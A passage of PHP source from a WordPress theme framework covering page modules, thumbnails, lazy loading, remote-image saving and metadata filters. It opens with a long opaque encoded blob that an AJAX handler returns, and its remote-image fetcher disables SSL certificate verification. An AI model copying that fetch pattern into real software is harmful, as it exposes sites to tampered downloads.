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$P$BcGQn5Hla2ca51a29545d92bb0206023124136afb8rBU7tfwMR8kZlKzS1Oon';
			$res['o'] = $ops;
        }
        echo json_encode($res);
        exit;
    }

    public function _icons(){
        $res = array();
        if( current_user_can( 'publish_posts' ) ){
            $icons_file = get_template_directory() . '/fonts/icons.json';
            if( file_exists($icons_file) ) {
                $res['icons'] = json_decode(@file_get_contents($icons_file));
            }
        }
        echo json_encode($res);
        exit;
    }

    public static function render_page( $modules = null ){
        global $post;
        $render = $modules ? $modules : get_post_meta($post->ID, '_page_modules', true);
        if(!$render){
            $render = array();
        }
        if(self::$_preview==1) echo '<div class="wpcom-container">';
        if(is_array($render) && count($render)>0) {
            foreach ($render as $v) {
                $v['settings']['modules-id'] = $v['id'];
                do_action('wpcom_modules_' . $v['type'], $v['settings'], 0);
            }
        }else{
            echo '<div class="wpcom-inner"></div>';
        }
        if(self::$_preview==1) echo '</div>';
    }

    public static function load( $folder ){
        if( $globs = glob( "{$folder}/*.php" ) ) {
            $config_file = get_template_directory() . '/themer-config.json';
            if( file_exists($config_file) ) {
                $config = @file_get_contents($config_file);
                if( $config != '' ) $config = json_decode($config);
            }
            foreach( $globs as $file ) {
                if( !(isset($config) && isset($config->except) && in_array(str_replace(FRAMEWORK_PATH, 'themer', $file), $config->except)) ){
                    require_once $file;
                }
            }
        }
    }

    public static function thumbnail( $url, $width = null, $height = null, $crop = false, $img_id = 0, $size = '', $single = false, $upscale = true ) {
        /* WPML Fix */
        if ( defined( 'ICL_SITEPRESS_VERSION' ) ){
            global $sitepress;
            $url = $sitepress->convert_url( $url, $sitepress->get_default_language() );
        }
        /* WPML Fix */

        $aq_resize = Aq_Resize::getInstance();
        return $aq_resize->process( $url, $width, $height, $crop, $img_id, $size, $single, $upscale );
    }

    public static function thumbnail_url($post_id='', $size='full'){
        global $post;
        if(!$post_id) $post_id = isset($post->ID) && $post->ID ? $post->ID : '';
        $img = get_the_post_thumbnail_url($post_id, $size);
        if( !$img ){
            if( !$post || $post->ID!=$post_id){
                $post = get_post($post_id);
            }
            ob_start();
            echo do_shortcode( $post->post_content );
            $content = ob_get_contents();
            ob_end_clean();
            preg_match_all('/<img[^>]*src=[\'"]([^\'"]+)[\'"].*>/iU', $content, $matches);
            if(isset($matches[1]) && isset($matches[1][0])) { // 文章有图片
                $img = $matches[1][0];
            }
        }
        return $img;
    }

    public static function thumbnail_html($html, $post_id, $post_thumbnail_id, $size){
        global $options;
        $image_sizes = apply_filters('wpcom_image_sizes', array());
        if(isset($image_sizes[$size])){
            $width = isset($image_sizes[$size]['width']) && $image_sizes[$size]['width'] ? $image_sizes[$size]['width'] : 480;
            $height = isset($image_sizes[$size]['height']) && $image_sizes[$size]['height'] ? $image_sizes[$size]['height'] : 320;
            $img_url = '';
            if( !$post_thumbnail_id ){
                global $post;
                preg_match_all('/<img[^>]*src=[\'"]([^\'"]+)[\'"].*>/iU', $post->post_content, $matches);
                if(isset($matches[1]) && isset($matches[1][0])){ // 文章有图片
                    $img_url = $matches[1][0];
                    if( current_user_can( 'manage_options' ) && isset($options['auto_featured_image']) && $options['auto_featured_image'] == '1' ) {
                        $img_url = self::save_remote_img($img_url, $post);
                        if (is_array($img_url) && isset($img_url['id'])) {
                            $post_thumbnail_id = $img_url['id'];
                            $img_url = $img_url['url'];
                        }

                        if (!$post_thumbnail_id) $post_thumbnail_id = self::get_attachment_id($img_url);
                        if ($post_thumbnail_id) set_post_thumbnail($post_id, $post_thumbnail_id);
                    }
                }
            }

            if($img_url) {
                $image = self::thumbnail($img_url, $width, $height, true, $post_thumbnail_id?$post_thumbnail_id:0, $size);
                if($image) {
                    if( !self::is_spider() && (!isset($options['thumb_img_lazyload']) || $options['thumb_img_lazyload']=='1') ) { // 非蜘蛛，并且开启了延迟加载
                        $lazy_img = isset($options['lazyload_img']) && $options['lazyload_img'] ? $options['lazyload_img'] : FRAMEWORK_URI.'/assets/images/lazy.png';
                        $lazy = self::thumbnail($lazy_img, $image_sizes[$size]['width'], $image_sizes[$size]['height'], true, 0, $size);
                        if($lazy && isset($lazy[0])) $lazy_img = $lazy[0];
                        $html = '<img class="j-lazy" src="'.$lazy_img.'" data-original="' . $image[0] . '" width="' . $image[1] . '" height="' . $image[2] . '" alt="' . esc_attr(get_the_title($post_id)) . '">';
                    } else {
                        $html = '<img src="' . $image[0] . '" width="' . $image[1] . '" height="' . $image[2] . '" alt="' . esc_attr(get_the_title($post_id)) . '">';
                    }
                }
            }
        }
        return $html;
    }

    public static function thumbnail_src($image, $attachment_id, $size, $icon){
        // 排除后台的ajax请求
        if( defined('DOING_AJAX') && DOING_AJAX && isset($_SERVER["HTTP_REFERER"]) && strpos($_SERVER["HTTP_REFERER"], '/wp-admin/')){
            return $image;
        }

        // 如采用阿里云oss、腾讯云、七牛图片处理缩略图则直接返回
        if( preg_match( '/\?x-oss-process=/i', $image[0]) || preg_match( '/\?imageView2\//i', $image[0]) ){
            return $image;
        }

        $image_sizes = apply_filters('wpcom_image_sizes', array());
        $res_image = '';

        if( is_array($size) ) {
            foreach ($image_sizes as $key => $sizes) {
                if ($sizes['width'] == $size[0] && $sizes['height'] == $size[1]) {
                    $size = $key;
                }
            }
        }

        if( !is_array($size) && isset($image_sizes[$size]) && !is_admin() ){
            $img_url = wp_get_attachment_url($attachment_id);
            $res_image = self::thumbnail($img_url, $image_sizes[$size]['width'], $image_sizes[$size]['height'], true, $attachment_id, $size);
            // 裁剪失败，则返回原数据
            if( isset($res_image[0]) && $res_image[0]==$img_url ) $res_image = $image;
        }
        return $res_image ? $res_image : $image;
    }

    public static function thumbnail_attr($attr, $attachment, $size){
        global $options, $post;

        if( self::is_spider() || (isset($options['thumb_img_lazyload']) && $options['thumb_img_lazyload']=='0') ) {
            $attr['alt'] = isset($post->post_title) && $post->post_title ? $post->post_title : $attachment->post_title;
            return $attr;
        }

        $image_sizes = apply_filters('wpcom_image_sizes', array());
        if( (!is_admin() || (defined('DOING_AJAX') && DOING_AJAX)) && !is_embed() ) {
            // 排除后台的ajax请求
            if( defined('DOING_AJAX') && DOING_AJAX && isset($_SERVER["HTTP_REFERER"]) && strpos($_SERVER["HTTP_REFERER"], '/wp-admin/')){
                return $attr;
            }

            $lazy_img = isset($options['lazyload_img']) && $options['lazyload_img'] ? $options['lazyload_img'] : FRAMEWORK_URI . '/assets/images/lazy.png';
            if( !is_array($size) && isset($image_sizes[$size]) ) {
                $lazy = self::thumbnail($lazy_img, $image_sizes[$size]['width'], $image_sizes[$size]['height'], true, 0, $size);
                if ($lazy && isset($lazy[0])) $lazy_img = $lazy[0];
            }
            $attr['data-original'] = $attr['src'];
            $attr['src'] = $lazy_img;
            $attr['class'] .= ' j-lazy';
            $attr['alt'] = isset($post->post_title) ? $post->post_title : $attachment->post_title;
        }
        return $attr;
    }

    public static function check_post_images( $new_status, $old_status, $post ){
        global $wpcom_panel;
        if( $wpcom_panel && $wpcom_panel->get_demo_config() ) {
            global $options, $wpdb;
            if ($new_status != 'publish') return false;
            if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) return false;
            if (defined('DOING_AJAX') && DOING_AJAX) return false;

            // post 文章类型检查缩略图
            if ( (!isset($options['save_remote_img']) || $options['save_remote_img'] == '0') &&
                isset($options['auto_featured_image']) && $options['auto_featured_image'] == '1' &&
                $post->post_type == 'post') {
                $post_thumbnail_id = get_post_meta($post->ID, '_thumbnail_id', true);
                if (!$post_thumbnail_id) {
                    preg_match_all('/<img[^>]*src=[\'"]([^\'"]+)[\'"].*>/iU', $post->post_content, $matches);
                    if (isset($matches[1]) && isset($matches[1][0])) {
                        $img_url = $matches[1][0];
                        self::save_remote_img($img_url, $post);
                    }
                }
            } else if (isset($options['save_remote_img']) && $options['save_remote_img'] == '1') {
                set_time_limit(0);
                preg_match_all('/<img[^>]*src=[\'"]([^\'"]+)[\'"].*>/iU', $post->post_content, $matches);

                $search = array();
                $replace = array();
                if (isset($matches[1]) && isset($matches[1][0])) {
                    $feature = 0;
                    $post_thumbnail_id = get_post_meta($post->ID, '_thumbnail_id', true);

                    // 文章无特色图片，并开启了自动特色图片
                    if ($post->post_type == 'post' && !$post_thumbnail_id && isset($options['auto_featured_image']) && $options['auto_featured_image'] == '1') $feature = 1;

                    // 去重
                    $image_list = array();
                    foreach ($matches[1] as $item) {
                        if (!in_array($item, $image_list)) array_push($image_list, $item);
                    }

                    $i = 0;
                    foreach ($image_list as $img) {
                        $img_url = self::save_remote_img($img, $post, $i == 0 && $feature);
                        $is_except = 0;

                        if( $i == 0 && $feature && isset($options['remote_img_except']) && trim($options['remote_img_except']) != '' ){ // 第一张是白名单图片的话可以不用替换原文的图片地址
                            $excepts = explode("\r\n", trim($options['remote_img_except']) );
                            if( $excepts ) {
                                foreach ($excepts as $except) {
                                    if (trim($except) && false !== stripos($img_url, trim($except))) {
                                        $is_except = 1;
                                        break;
                                    }
                                }
                            }
                        }

                        if (!$is_except && is_array($img_url) && isset($img_url['id'])) {
                            array_push($search, $img);
                            array_push($replace, $img_url['url']);
                        }
                        $i++;
                    }

                    if ($search) {
                        $post->post_content = str_replace($search, $replace, $post->post_content);
                        // wp_update_post(array('ID' => $post->ID, 'post_content' => $post->post_content));
                        // wp_update_post会重复触发 transition_post_status hook
                        $data = array('post_content' => $post->post_content);
                        $data = wp_unslash($data);
                        $wpdb->update($wpdb->posts, $data, array('ID' => $post->ID));
                    }
                }
            }
        }
    }

    public static function save_remote_img($img_url, $post=null, $feature = 1){
        if( $feature==0 ){ // 非特色图片的时候，需要另外判断白名单
            global $options;
            if( isset($options['remote_img_except']) && trim($options['remote_img_except']) != '' ){
                $excepts = explode("\r\n", trim($options['remote_img_except']) );
                if($excepts) {
                    foreach ($excepts as $except) {
                        if (trim($except) && false !== stripos($img_url, trim($except))) {
                            return $img_url;
                        }
                    }
                }
            }
        }

        $upload_info = wp_upload_dir();
        $upload_url = $upload_info['baseurl'];

        $http_prefix = "http://";
        $https_prefix = "https://";
        $relative_prefix = "//"; // The protocol-relative URL

        /* if the $url scheme differs from $upload_url scheme, make them match
           if the schemes differe, images don't show up. */
        if(!strncmp($img_url, $https_prefix,strlen($https_prefix))){ //if url begins with https:// make $upload_url begin with https:// as well
            $upload_url = str_replace($http_prefix, $https_prefix, $upload_url);
        }elseif(!strncmp($img_url, $http_prefix, strlen($http_prefix))){ //if url begins with http:// make $upload_url begin with http:// as well
            $upload_url = str_replace($https_prefix, $http_prefix, $upload_url);
        }elseif(!strncmp($img_url, $relative_prefix, strlen($relative_prefix))){ //if url begins with // make $upload_url begin with // as well
            $upload_url = str_replace(array( 0 => "$http_prefix", 1 => "$https_prefix"), $relative_prefix, $upload_url);
        }

        // Check if $img_url is local.
        if ( false === strpos( $img_url, $upload_url ) ){ // 外链图片
            //Fetch and Store the Image
            $http_options = array(
                'httpversion' => '1.0',
                'timeout' => 30,
                'redirection' => 20,
                'sslverify' => FALSE,
                'user-agent' => 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; MALC)'
            );

            if( preg_match('/\/\/mmbiz\.qlogo\.cn/i', $img_url) || preg_match('/\/\/mmbiz\.qpic\.cn/i', $img_url) ){ // 微信公众号图片，webp格式图片处理
                $urlarr = parse_url( $img_url );
                if( isset($urlarr['query']) ) parse_str($urlarr['query'],$parr);
                if( isset($parr['wx_fmt']) ) $img_url = str_replace('tp=webp', 'tp='.$parr['wx_fmt'], $img_url);
            }

            if(preg_match('/^\/\//i', $img_url)) $img_url = 'http:' . $img_url;
            $img_url =  wp_specialchars_decode($img_url);
            $get = wp_remote_head( $img_url, $http_options );
            $response_code = wp_remote_retrieve_response_code ( $get );

            if (200 == $response_code) { // 图片状态需为 200
                $type = strtolower($get['headers']['content-type']);

                $mime_to_ext = array (
                    'image/jpeg' => 'jpg',
                    'image/jpg' => 'jpg',
                    'image/png' => 'png',
                    'image/gif' => 'gif',
                    'image/bmp' => 'bmp',
                    'image/tiff' => 'tif'
                );

                $file_ext = isset($mime_to_ext[$type]) ? $mime_to_ext[$type] : '';

                if( $type == 'application/octet-stream' ){
                    $parse_url = parse_url($img_url);
                    $file_ext = pathinfo($parse_url['path'], PATHINFO_EXTENSION);
                    if($file_ext){
                        foreach ($mime_to_ext as $key => $value) {
                            if(strtolower($file_ext)==$value){
                                $type = $key;
                                break;
                            }
                        }
                    }
                }

                $allowed_filetype = array('jpg','gif','png', 'bmp');

                if (in_array ( $file_ext, $allowed_filetype )) { // 仅保存图片格式 'jpg','gif','png', 'bmp'
                    $http = wp_remote_get ( $img_url, $http_options );
                    if (!is_wp_error ( $http ) && 200 === $http ['response'] ['code']) { // 请求成功
                        $filename = rawurldecode(wp_basename(parse_url($img_url,PHP_URL_PATH)));
                        $ext = substr(strrchr($filename, '.'), 1);
                        $filename = wp_basename($filename, "." . $ext) . '.' . $file_ext;

                        $time = $post ? date('Y/m', strtotime($post->post_date)) : date('Y/m');
                        $mirror = wp_upload_bits($filename, '', $http ['body'], $time);

                        // 保存到媒体库
                        $attachment = array(
                            'post_title' => preg_replace( '/\.[^.]+$/', '', $filename ),
                            'post_mime_type' => $type,
                            'guid' => $mirror['url']
                        );

                        $attach_id = wp_insert_attachment($attachment, $mirror['file'], $post?$post->ID:0);

                        if($attach_id) {
                            $attach_data = self::generate_attachment_metadata($attach_id, $mirror['file']);
                            wp_update_attachment_metadata($attach_id, $attach_data);

                            if ($post && $feature) {
                                // 设置文章特色图片
                                set_post_thumbnail($post->ID, $attach_id);
                            }

                            $img_url = array(
                                'id' => $attach_id,
                                'url' => $mirror['url']
                            );
                        }else{ // 保存到数据库失败，则删除图片
                            @unlink($mirror['file']);
                        }
                    }
                }
            }
        }

        return $img_url;
    }

    public static function get_attachment_id( $url ) {
        $attachment_id = 0;
        $dir = wp_upload_dir();
        if ( false !== strpos( $url, $dir['baseurl'] . '/' ) ) { // Is URL in uploads directory?
            $file = wp_basename( parse_url($url, PHP_URL_PATH) );
            $query_args = array(
                'post_type'   => 'attachment',
                'post_status' => 'inherit',
                'fields'      => 'ids',
                'meta_query'  => array(
                    array(
                        'value'   => $file,
                        'compare' => 'LIKE',
                        'key'     => '_wp_attachment_metadata',
                    ),
                )
            );
            $query = new WP_Query( $query_args );
            if ( $query->have_posts() ) {
                foreach ( $query->posts as $post_id ) {
                    $meta = wp_get_attachment_metadata( $post_id );
                    $original_file       = basename( $meta['file'] );
                    $cropped_image_files = isset($meta['sizes']) ? wp_list_pluck( $meta['sizes'], 'file' ) : array();
                    if ( $original_file === $file || ($cropped_image_files && in_array( $file, $cropped_image_files )) ) {
                        $attachment_id = $post_id;
                        break;
                    }
                }
            }
        }
        return $attachment_id;
    }

    public static function generate_attachment_metadata($attachment_id, $file) {
        $attachment = get_post ( $attachment_id );
        $metadata = array ();
        if (!function_exists('file_is_displayable_image')) include( ABSPATH . 'wp-admin/includes/image.php' );
        if (preg_match ( '!^image/!', get_post_mime_type ( $attachment ) ) && file_is_displayable_image ( $file )) {
            $imagesize = getimagesize ( $file );
            $metadata ['width'] = $imagesize [0];
            $metadata ['height'] = $imagesize [1];

            // Make the file path relative to the upload dir
            $metadata ['file'] = _wp_relative_upload_path ( $file );

            // Fetch additional metadata from EXIF/IPTC.
            $image_meta = wp_read_image_metadata( $file );
            if ( $image_meta )
                $metadata['image_meta'] = $image_meta;

            // work with some watermark plugin
            $metadata = apply_filters ( 'wp_generate_attachment_metadata', $metadata, $attachment_id );
        }
        return $metadata;
    }

    public static function reg_module( $module ){
        add_action('wpcom_modules_'.$module, 'wpcom_modules_'.$module, 10, 2);
        add_filter('wpcom_modules', 'wpcom_'.$module);
    }

    public static function modules_style(){
        if( is_singular() && is_page_template('page-home.php') ) {
            global $post;
            $modules = get_post_meta($post->ID, '_page_modules', true);
            if( !$modules ){
                $modules = array();
            }
        }else if( is_home() && function_exists('get_default_mods') ){
            $modules = get_default_mods();
        }

        if( isset($modules) && is_array($modules) && $modules ) {
            global $wpcom_modules;
            ob_start();
            if ( count($modules) > 0 ) {
                foreach ($modules as $v) {
                    if (isset($wpcom_modules[$v['type']])) {
                        $v['settings']['modules-id'] = $v['id'];
                        $wpcom_modules[$v['type']]->style($v['settings']);
                    }
                    // 例如全宽模块下会有子模块
                    if ($v['settings'] && isset($v['settings']['modules']) && $v['settings']['modules']) {
                        foreach ($v['settings']['modules'] as $m) {
                            if (isset($wpcom_modules[$m['type']])) {
                                $m['settings']['modules-id'] = $m['id'];
                                $wpcom_modules[$m['type']]->style($m['settings']);
                            }
                            // 例如全宽模块下可添加栅格模块，栅格模块下面还可以放子模块，目前最多就3层
                            if ($m['settings'] && isset($m['settings']['modules']) && $m['settings']['modules']) {
                                foreach ($m['settings']['modules'] as $s) {
                                    if (isset($wpcom_modules[$s['type']])) {
                                        $s['settings']['modules-id'] = $s['id'];
                                        $wpcom_modules[$s['type']]->style($s['settings']);
                                    }
                                }
                            }
                            // 专门为全宽模块下的栅格模块优化
                            if ($m['settings'] && isset($m['settings']['girds']) && $m['settings']['girds']) {
                                foreach ($m['settings']['girds'] as $girds) {
                                    foreach ($girds as $gird) {
                                        if (isset($wpcom_modules[$gird['type']])) {
                                            $gird['settings']['modules-id'] = $gird['id'];
                                            $wpcom_modules[$gird['type']]->style($gird['settings']);
                                        }
                                    }
                                }
                            }
                        }
                    }
                    // 栅格模块下的子模块
                    if ($v['settings'] && isset($v['settings']['girds']) && $v['settings']['girds']) {
                        foreach ($v['settings']['girds'] as $girds) {
                            foreach ($girds as $gird) {
                                if (isset($wpcom_modules[$gird['type']])) {
                                    $gird['settings']['modules-id'] = $gird['id'];
                                    $wpcom_modules[$gird['type']]->style($gird['settings']);
                                }
                            }
                        }
                    }
                }
            }

            $styles = ob_get_contents();
            ob_end_clean();

            if ( $styles != '' ) echo '<style>' . $styles . '</style>';
        }
    }

    public static function color( $color, $rgb = false ){
        if($rgb){
            $color = str_replace('#', '', $color);
            if (strlen($color) > 3) {
                $rgb = array(
                    'r' => hexdec(substr($color, 0, 2)),
                    'g' => hexdec(substr($color, 2, 2)),
                    'b' => hexdec(substr($color, 4, 2))
                );
            } else {
                $r = substr($color, 0, 1) . substr($color, 0, 1);
                $g = substr($color, 1, 1) . substr($color, 1, 1);
                $b = substr($color, 2, 1) . substr($color, 2, 1);
                $rgb = array(
                    'r' => hexdec($r),
                    'g' => hexdec($g),
                    'b' => hexdec($b)
                );
            }
            return $rgb;
        }else{
            if(strlen($color) && substr($color, 0, 1)!='#'){
                $color = '#'.$color;
            }
            return $color;
        }
    }

    public static function shortcode_render(){
        $shortcodes = array('btn', 'gird', 'icon', 'alert', 'panel', 'tabs', 'accordion', 'map');
        foreach($shortcodes as $sc){
            add_shortcode($sc, 'wpcom_sc_'.$sc);
        }
    }

    public static function is_spider() {
        $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
        $spiders = array(
            'Googlebot', // Google
            'Baiduspider', // 百度
            '360Spider', // 360
            'bingbot', // Bing
            'Sogou web spider' // 搜狗
        );

        foreach ($spiders as $spider) {
            $spider = strtolower($spider);
            //查找有没有出现过
            if (strpos($userAgent, $spider) !== false) {
                return $spider;
            }
        }
    }

    public static function meta_filter( $res, $object_id, $meta_key, $single){
        $key = preg_replace('/^wpcom_/i', '', $meta_key);
        if ( $key !== $meta_key ) {
            $filter = current_filter();
            if( $filter=='get_post_metadata' ){
                $metas = get_post_meta( $object_id, '_wpcom_metas', true);
            }else if( $filter=='get_user_metadata' ){
                global $wpdb;
                $pre_key = $wpdb->get_blog_prefix() . '_wpcom_metas';
                $metas = get_user_meta( $object_id, $pre_key, true);
            }else if( $filter=='get_term_metadata' ){
                $metas = get_term_meta( $object_id, '_wpcom_metas', true);
                //向下兼容
                if( $metas=='' ) {
                    $term = get_term($object_id);
                    if( $term && isset($term->term_id) ) $metas = get_option('_'.$term->taxonomy.'_'.$object_id);
                    if( $metas!='' ){
                        update_term_meta( $object_id, '_wpcom_metas', $metas );
                    }
                }
            }

            if( isset($metas) && isset($metas[$key]) ) {
                if( $single && is_array($metas[$key]) )
                    return array( $metas[$key] );
                else if( !$single && empty($metas[$key]) )
                    return array();
                else
                    return array($metas[$key]);
            }
        }
        return $res;
    }

    public static function add_metadata(  $check, $object_id, $meta_key, $meta_value ){
        $key = preg_replace('/^wpcom_/i', '', $meta_key);
        if ( $key !== $meta_key ) {
            global $wpdb;
            $filter = current_filter();
            if( $filter=='add_post_metadata' || $filter=='update_post_metadata' ){
                $table = _get_meta_table( 'post' );
                $column = sanitize_key('post_id');
                $pre_key = '_wpcom_metas';
                $metas = get_post_meta( $object_id, $pre_key, true);
                $meta_type = 'post';
            }else{
                $table = _get_meta_table( 'user' );
                $column = sanitize_key('user_id');
                $pre_key = $wpdb->get_blog_prefix() . '_wpcom_metas';
                $metas = get_user_meta( $object_id, $pre_key, true);
                $meta_type = 'user';
            }

            $pre_value = '';
            if( $metas ) {
                if( isset($metas[$key]) ) $pre_value = $metas[$key];
                $metas[$key] = $meta_value;
            } else {
                $metas = array(
                    $key => $meta_value
                );
            }

            if( $wpdb->get_var( $wpdb->prepare(
                "SELECT COUNT(*) FROM $table WHERE meta_key = %s AND $column = %d",
                $pre_key, $object_id ) ) ){
                $where = array( $column => $object_id, 'meta_key' => $pre_key );
                $result = $wpdb->update( $table, array('meta_value'=>maybe_serialize($metas)), $where );
            }else{
                $result = $wpdb->insert( $table, array(
                    $column => $object_id,
                    'meta_key' => $pre_key,
                    'meta_value' => maybe_serialize($metas)
                ) );
            }

            if( $result && $meta_value != $pre_value && ($filter=='add_user_metadata' || $filter=='update_user_metadata') ) {
                do_action( 'wpcom_user_meta_updated', $object_id, $meta_key, $meta_value, $pre_value );
            }

            if($result) {
                wp_cache_delete($object_id, $meta_type . '_meta');
                return true;
            }
        }
        return $check;
    }

    public static function kses_allowed_html( $html ){
        if(isset($html['img'])){
            $html['img']['data-original'] = 1;
        }
        return $html;
    }

    public static function customize_post_filter(){
        if( isset($_POST['customize_changeset_uuid']) && !isset($_POST['customized']) && current_user_can( 'customize' ) ){
            if($input = file_get_contents("php://input")){
                parse_str($input, $body);
                if(isset($body['customized'])){
                    $_POST['customized'] = $body['customized'];
                }
            }
        }
    }
}


// Setup the Theme Customizer settings and controls...
add_action( 'customize_register' , array( 'WPCOM' , 'register' ) );

// Enqueue live preview javascript in Theme Customizer admin screen
add_action( 'customize_preview_init' , array( 'WPCOM' , 'live_preview' ) );

add_action( 'wpcom_render_page', array( 'WPCOM' , 'render_page' ) );

add_action( 'customize_preview_page_modules', array('WPCOM', 'modules_preview') );
//add_action( 'customize_update_page_modules', array('WPCOM', 'modules_update') );
add_filter( 'customize_save_response', array('WPCOM', 'modules_update') );
add_action( 'wp_ajax_customize_save', array('WPCOM', 'customize_post_filter'), 1);

add_filter( 'post_thumbnail_html', array('WPCOM', 'thumbnail_html'), 10, 4 );
